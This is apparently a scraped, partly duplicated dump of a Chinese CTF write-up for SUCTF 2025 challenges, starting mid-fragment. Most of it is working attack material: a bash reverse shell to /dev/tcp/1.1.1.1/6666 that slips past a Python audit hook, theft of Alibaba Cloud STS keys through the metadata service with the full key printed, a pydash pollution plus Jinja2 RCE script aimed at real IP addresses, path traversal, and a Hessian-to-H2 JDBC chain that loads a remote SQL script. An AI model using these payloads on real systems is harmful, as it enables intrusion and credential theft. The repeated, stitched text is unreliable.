AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"SUCTFWP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = 